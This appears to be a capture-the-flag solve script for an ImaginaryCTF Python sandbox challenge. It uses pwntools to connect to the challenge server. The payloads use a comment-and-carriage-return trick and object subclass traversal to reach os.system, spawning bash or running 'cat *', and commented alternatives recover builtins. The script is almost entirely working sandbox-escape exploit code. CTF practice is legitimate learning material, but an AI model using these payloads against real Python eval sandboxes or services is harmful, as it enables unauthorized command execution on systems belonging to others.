#!/usr/bin/env python3

from pwn import *

# https://www.jorianwoltjer.com/blog/post/ctf/cyber-apocalypse-2021/build-yourself-in

# io = process(["python3", "./server.py"])
io = remote("puzzler7.imaginaryctf.org", 11004)

code = [
    "#\r().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('bash')",
    # b"#\r__builtins__ = [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__",
    # b"#\r__builtins__['__import__']('os').system('ls')",
]

for c in code:
    io.sendline(c)

io.send(b"\n")

io.interactive()

"""
from pwn import *

payload = '#\r[ x.__init__.__globals__ for x in "".__class__.__base__.__subclasses__() if "wrapper" not in "".__class__(x.__init__) and "os" == x.__init__.__globals__["__name__"]][0]["system"]("cat *")'

# p = process(["python3", "./server.py"])
p = remote("puzzler7.imaginaryctf.org", 11004)
p.sendline(payload + "\n")
print(p.recvall())
"""
